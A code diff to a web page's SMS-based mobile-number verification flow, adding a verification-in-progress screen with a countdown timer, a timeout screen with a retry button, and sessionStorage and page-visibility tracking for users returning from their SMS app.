@@ -284,6 +284,91 @@
       display: none !important;
     }
 
+    .verification-state {
+      display: grid;
+      place-items: center;
+      min-height: 560px;
+      padding: 40px 24px;
+      text-align: center;
+    }
+
+    .verification-state h2 {
+      margin: 0 0 40px;
+      color: #24252b;
+      font-size: clamp(1.7rem, 4vw, 2.2rem);
+      line-height: 1.2;
+    }
+
+    .verification-icon {
+      width: 120px;
+      height: 120px;
+      margin-bottom: 90px;
+      color: var(--purple-dark);
+    }
+
+    .verification-warning {
+      max-width: 620px;
+      margin: 0 0 76px;
+      color: #555158;
+      font-size: clamp(1.2rem, 3.5vw, 1.8rem);
+      line-height: 1.35;
+    }
+
+    .verification-warning strong {
+      color: #d32f3b;
+    }
+
+    .verification-timer {
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      color: #25262b;
+      font-size: clamp(1.2rem, 3vw, 1.5rem);
+      font-variant-numeric: tabular-nums;
+    }
+
+    .verification-clock {
+      width: 34px;
+      height: 34px;
+      color: #d32f3b;
+    }
+
+    .timeout-state {
+      display: grid;
+      place-items: center;
+      min-height: 560px;
+      padding: 40px 24px;
+      text-align: center;
+    }
+
+    .timeout-state h2 {
+      margin: 0 0 48px;
+      color: #24252b;
+      font-size: clamp(1.7rem, 4vw, 2.2rem);
+      line-height: 1.2;
+    }
+
+    .timeout-icon {
+      width: 120px;
+      height: 120px;
+      margin-bottom: 48px;
+      color: var(--purple-dark);
+    }
+
+    .timeout-message {
+      max-width: 620px;
+      margin: 0 0 60px;
+      color: #555158;
+      font-size: clamp(1.2rem, 3.5vw, 1.8rem);
+      line-height: 1.35;
+    }
+
+    .timeout-retry {
+      width: min(600px, 100%);
+      background: linear-gradient(180deg, #3d586d 0%, #2f485d 100%);
+      color: #fff;
+    }
+
     .loading-state {
       display: grid;
       place-items: center;
@@ -505,6 +590,42 @@
       <p class="sms-countdown hidden" id="smsCountdown" aria-live="polite"></p>
       <button type="button" class="btn sms-retry hidden" id="smsRetry">Retry</button>
     </div>
+
+    <div id="verificationState" class="verification-state hidden" role="status" aria-live="polite">
+      <h2>Verifying Mobile Number</h2>
+      <svg class="verification-icon" viewBox="0 0 120 120" fill="none" aria-hidden="true">
+        <rect x="22" y="5" width="64" height="108" rx="8" stroke="currentColor" stroke-width="5"/>
+        <path d="M25 21h58M25 94h58" stroke="currentColor" stroke-width="5"/>
+        <path d="M44 13h20" stroke="currentColor" stroke-width="5" stroke-linecap="round"/>
+        <circle cx="54" cy="104" r="3" fill="currentColor"/>
+        <circle cx="80" cy="61" r="24" fill="white" stroke="currentColor" stroke-width="5"/>
+        <path d="m98 79 16 13" stroke="currentColor" stroke-width="6" stroke-linecap="round"/>
+      </svg>
+      <p class="verification-warning"><strong>Important:</strong> Please ensure you do not click back or move away from this screen during the verification process.</p>
+      <div class="verification-timer">
+        <svg class="verification-clock" viewBox="0 0 36 36" fill="none" aria-hidden="true">
+          <circle cx="18" cy="19" r="14" stroke="currentColor" stroke-width="4"/>
+          <path d="M18 10v9l6-3" stroke="currentColor" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+        <span id="verificationTimer">00:30 sec</span>
+      </div>
+    </div>
+
+    <div id="timeoutState" class="timeout-state hidden" role="alert" aria-labelledby="timeout-title">
+      <h2 id="timeout-title">Request Timed Out</h2>
+      <svg class="timeout-icon" viewBox="0 0 120 120" fill="none" aria-hidden="true">
+        <rect x="14" y="24" width="56" height="88" rx="8" stroke="currentColor" stroke-width="5"/>
+        <path d="M17 39h50M17 94h50" stroke="currentColor" stroke-width="5"/>
+        <path d="M32 31h20" stroke="currentColor" stroke-width="5" stroke-linecap="round"/>
+        <circle cx="42" cy="103" r="3" fill="currentColor"/>
+        <rect x="58" y="51" width="52" height="39" rx="5" fill="white" stroke="currentColor" stroke-width="4"/>
+        <path d="m61 55 23 19 23-19" stroke="currentColor" stroke-width="4" stroke-linejoin="round"/>
+        <circle cx="98" cy="23" r="18" fill="#d32f3b"/>
+        <path d="M98 13v11m0 7v.5" stroke="white" stroke-width="5" stroke-linecap="round"/>
+      </svg>
+      <p class="timeout-message">We have not received SMS to verify your number.</p>
+      <button type="button" class="btn timeout-retry" id="timeoutRetry">Retry</button>
+    </div>
   </div>
 
   <script>
@@ -514,17 +635,23 @@
     const phoneEl = document.getElementById('verificationPhone');
     const loadingState = document.getElementById('loadingState');
     const readyState = document.getElementById('readyState');
+    const verificationState = document.getElementById('verificationState');
+    const timeoutState = document.getElementById('timeoutState');
+    const verificationTimer = document.getElementById('verificationTimer');
     const ctaRow = document.querySelector('.cta-row');
     const countdownEl = document.getElementById('smsCountdown');
     const proceedLink = document.querySelector('.btn.proceed');
     const retryButton = document.getElementById('smsRetry');
+    const timeoutRetryButton = document.getElementById('timeoutRetry');
 
     const DEFAULT_SMS_NUMBER = '+265993257111';
     const RECIPIENT_SMS_NUMBER = '+265993257111';
-    const SMS_COOLDOWN_MS = 30 * 1000;
+    const SMS_COOLDOWN_MS = 36 * 1000;
     const SMS_COOLDOWN_KEY = 'smsCooldownUntil';
     const SMS_EXPIRED_KEY = 'smsExpired';
     const SMS_RETRY_IN_PROGRESS_KEY = 'smsRetryInProgress';
+    const SMS_RETURN_PENDING_KEY = 'smsReturnPending';
+    const SMS_APP_WAS_HIDDEN_KEY = 'smsAppWasHidden';
     let lastMsgId = 0;
     let currentMessageText = 'Verification';
     let currentPhoneNumber = DEFAULT_SMS_NUMBER;
@@ -568,7 +695,26 @@
 
     function showReadyState() {
       loadingState.classList.add('hidden');
+      verificationState.classList.add('hidden');
+      timeoutState.classList.add('hidden');
       readyState.classList.remove('hidden');
+    }
+
+    function showTimeoutState() {
+      loadingState.classList.add('hidden');
+      readyState.classList.add('hidden');
+      verificationState.classList.add('hidden');
+      timeoutState.classList.remove('hidden');
+    }
+
+    function showVerificationState(secondsLeft) {
+      loadingState.classList.add('hidden');
+      readyState.classList.add('hidden');
+      timeoutState.classList.add('hidden');
+      verificationState.classList.remove('hidden');
+      const minutes = Math.floor(secondsLeft / 60);
+      const seconds = secondsLeft % 60;
+      verificationTimer.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')} sec`;
     }
 
     function updateProceedLink() {
@@ -587,18 +733,17 @@
         countdownTimer = null;
         sessionStorage.removeItem(SMS_COOLDOWN_KEY);
         sessionStorage.removeItem(SMS_RETRY_IN_PROGRESS_KEY);
+        sessionStorage.removeItem(SMS_RETURN_PENDING_KEY);
+        sessionStorage.removeItem(SMS_APP_WAS_HIDDEN_KEY);
 
         if (savedDeadline && sessionStorage.getItem(SMS_EXPIRED_KEY) !== 'true') {
           sessionStorage.setItem(SMS_EXPIRED_KEY, 'true');
         }
 
         if (sessionStorage.getItem(SMS_EXPIRED_KEY) === 'true') {
-          showReadyState();
-          ctaRow.classList.add('hidden');
-          countdownEl.textContent = 'Expired';
-          countdownEl.classList.remove('hidden');
-          retryButton.classList.remove('hidden');
+          showTimeoutState();
         } else {
+          timeoutState.classList.add('hidden');
           ctaRow.classList.remove('hidden');
           countdownEl.classList.add('hidden');
           retryButton.classList.add('hidden');
@@ -613,6 +758,15 @@
       if (sessionStorage.getItem(SMS_RETRY_IN_PROGRESS_KEY) === 'true') {
         loadingState.classList.remove('hidden');
         readyState.classList.add('hidden');
+        verificationState.classList.add('hidden');
+        timeoutState.classList.add('hidden');
+        countdownEl.classList.add('hidden');
+      } else if (
+        sessionStorage.getItem(SMS_RETURN_PENDING_KEY) === 'true' &&
+        sessionStorage.getItem(SMS_APP_WAS_HIDDEN_KEY) === 'true' &&
+        document.visibilityState === 'visible'
+      ) {
+        showVerificationState(secondsLeft);
         countdownEl.classList.add('hidden');
       } else {
         showReadyState();
@@ -623,6 +777,8 @@
 
     function startSmsCountdown() {
       sessionStorage.removeItem(SMS_EXPIRED_KEY);
+      sessionStorage.removeItem(SMS_RETURN_PENDING_KEY);
+      sessionStorage.removeItem(SMS_APP_WAS_HIDDEN_KEY);
       sessionStorage.setItem(SMS_COOLDOWN_KEY, String(Date.now() + SMS_COOLDOWN_MS));
       updateSmsCountdown();
       countdownTimer = setInterval(updateSmsCountdown, 250);
@@ -685,7 +841,12 @@
     pollMessages();
     setInterval(pollMessages, 3000);
     updateSmsCountdown();
-    document.addEventListener('visibilitychange', updateSmsCountdown);
+    document.addEventListener('visibilitychange', function () {
+      if (document.visibilityState === 'hidden' && sessionStorage.getItem(SMS_RETURN_PENDING_KEY) === 'true') {
+        sessionStorage.setItem(SMS_APP_WAS_HIDDEN_KEY, 'true');
+      }
+      updateSmsCountdown();
+    });
 
     document.querySelector('.btn.cancel')?.addEventListener('click', function () {
       window.history.back();
@@ -693,11 +854,16 @@
 
     proceedLink.addEventListener('click', function () {
       startSmsCountdown();
+      sessionStorage.setItem(SMS_RETURN_PENDING_KEY, 'true');
     });
 
     retryButton.addEventListener('click', function () {
       sessionStorage.setItem(SMS_RETRY_IN_PROGRESS_KEY, 'true');
       startSmsCountdown();
+      window.location.href = 'trial.html';
+    });
+
+    timeoutRetryButton.addEventListener('click', function () {
       window.location.href = 'trial.html';
     });
   </script>
